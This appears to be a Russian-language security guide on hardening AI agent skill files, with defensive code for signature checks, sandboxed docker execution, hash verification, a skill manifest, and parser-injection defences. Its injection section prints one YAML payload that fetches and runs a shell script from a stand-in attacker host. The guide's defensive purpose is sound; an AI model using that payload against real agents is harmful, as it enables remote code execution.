### Подпись skill.md / memory.md and проверка до использования
```py
import nacl.encoding
from nacl.signing import VerifyKey
from nacl.exceptions import BadSignatureError
def verify_skill_signature(skill_content: str, signature: str, public_key: str) ->

bool:
 """Verify Ed25519 signature of skill content using PyNaCl (the 'ed25519' PyPI
package is unmaintained)."""
 try:
 verify_key = VerifyKey(public_key, encoder=nacl.encoding.HexEncoder)
 verify_key.verify(skill_content.encode(), bytes.fromhex(signature))
 return True
 except BadSignatureError:
 return False
# Usage in registry - pubkey is resolved from a trust store keyed by publisher
identity,
# never accepted from the skill payload itself, so a self-signed attacker key cannot
pass verification.
def install_skill(skill_path: str, signature: str, publisher_id: str):
 trusted_key = TRUST_STORE.get_active_key(publisher_id) # raises if unknown or
revoked
 with open(skill_path, 'r') as f:
 content = f.read()
 if not verify_skill_signature(content, signature, trusted_key):
 raise ValueError("Invalid skill signature")
 # Proceed with installation
```

### Изоляция окружения при исполнении skill
```py
import subprocess
import uuid
from pathlib import Path
ALLOWED_ROOT = Path('/srv/approved-skills').resolve()
IMAGE = 'alpine@sha256:<approved-digest>'
def run_skill_in_sandbox(skill_script: str, timeout: int = 30):
 '''Run an approved regular file in a locked-down, digest-pinned container.'''
 # is_relative_to() requires Python 3.9+
 script = Path(skill_script).resolve(strict=True)
 if not script.is_file() or not script.is_relative_to(ALLOWED_ROOT):
 raise ValueError('Skill script is outside the approved root')
 name = f'skill-{uuid.uuid4().hex}'
 cmd = [
 'docker', 'run', '--rm', '--name', name, '--init',
 '--network=none', '--read-only', '--user=65532:65532',
 '--cap-drop=ALL', '--security-opt=no-new-privileges',
 '--pids-limit=64', '--memory=128m', '--cpus=0.5',
 '--tmpfs=/tmp:rw,noexec,nosuid,size=16m',
 '--env=SANDBOX=1',
 '--mount', f'type=bind,src={script},dst=/skill.sh,readonly',
 IMAGE, 'sh', '/skill.sh',
 ]
 try:
 result = subprocess.run(
 cmd, capture_output=True, timeout=timeout,
 stdin=subprocess.DEVNULL, check=False
 )
 except subprocess.TimeoutExpired:
 subprocess.run(
 ['docker', 'rm', '-f', name],
 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
 )
 raise
 return result.returncode, result.stdout, result.stderr
```

### Проверка репозитория если skill скачиваются из внешнего источника - проверка хеша
```py
import hashlib
def verify_skill_file(file_path: str, expected_hash: str) -> bool:
 """Verify integrity of SKILL.md"""
 with open(file_path, "rb") as f:
 content = f.read()
 actual_hash = hashlib.sha256(content).hexdigest()
 return actual_hash == expected_hash
```

### Использование Skill Manifest для определения что должен и не должен делать и проверка
Использовать структуру https://owasp.org/www-project-agentic-skills-top-10/universal-skill-format.html
Альтернативно указывать явно это в md файле как метаинформация
```
---
name: Помощник по погоде
description: Получает погоду для указанного города. Используйте, когда пользователь спрашивает "какая погода в...".
allowed-tools: [ "curl", "grep" ]
argument-hint: [city]
---

# Инструкции для ИИ
Здесь вы пишете подробный текст (промпт) о том, как именно ИИ должен выполнять эту задачу...
```

Либо использовать отдельный манифест файл
```
my-agent-skills/
└── weather-helper/
    ├── manifest.json  <-- Техническое описание (то, что я показывал в прошлом ответе)
    ├── README.md      <-- Документация для разработчика
    └── scripts/       <-- (Опционально) Скрипты, которые ИИ будет запускать
```

```manifest.json
{
  "manifestVersion": "1.0",
  "skillId": "weather-and-travel-helper",
  "name": "Помощник по погоде и путешествиям",
  "description": "Навык позволяет узнавать текущую погоду и автоматически бронировать билеты на основе прогноза.",
  "version": "2.1.0",
  "author": "AI Developer",
  "endpoint": "https://myassistant.local",
  "permissions": [
    "user_location",
    "calendar_write"
  ],
  "actions": [
    {
      "name": "get_current_weather",
      "description": "Получает текущую погоду для указанного города.",
      "parameters": {
        "type": "object",
        "properties": {
          "city": {
            "type": "string",
            "description": "Название города на русском или английском языке (например, Москва, Paris)."
          },
          "units": {
            "type": "string",
            "enum": ["celsius", "fahrenheit"],
            "default": "celsius"
          }
        },
        "required": ["city"]
      }
    }
  ]
}
```

### Защита от инъекций
Проверка файла и защита от атаки на парсеры. Например если код агента использует yaml.UnsafeLoader для загрузки скилла что в свою очередь 
позволяет сделать иньекцию `!!python/object/apply:os.system ["curl attacker.com/payload.sh | bash"] -`
Меры защиты
● Use safe parsers by default - disable dangerous tags (!!python/object, !!python/apply; yaml.load ->
yaml.safe_load) and apply an allowlist of permitted YAML/JSON keys, rejecting any unexpected fields.
● Validate metadata against a schema (e.g., JSON Schema, Pydantic) before any deserialization of
skill-provided data.
● Apply static analysis to all metadata fields and SKILL.md prose at publish time: flag suspicious
patterns in general, and specifically ASCII smuggling, base64 payloads, and zero-width characters
invisible to human reviewers.
● Validate declared permissions against actual runtime behavior in a sandboxed pre-publish test, and
cross-reference risk_tier declarations against the permission manifest scope.
● Parse skill files in an isolated, least-privilege subprocess or container - never deserialize with elevated
privileges, and treat requirements.txt, package.json, and pyproject.toml as untrusted code whose
installation is sandboxed.
● Enforce brand/trademark protection and surface metadata provenance (who declared it, when, from
which signing key) in the registry UI.

### Аудит skill через сканеры
● Deploy behavioral analysis scanners that evaluate intent, not just signatures - using calibrated models
combined with deterministic rules. Agent-skill-aware scanners such as NVIDIA SkillSpector
(https://github.com/NVIDIA/SkillSpector) (open source, Apache-2.0) pair fast static checks with
optional LLM semantic analysis for exactly this purpose.
● Проверка наличия сетевых запросов
● Соответсвие скилла семантике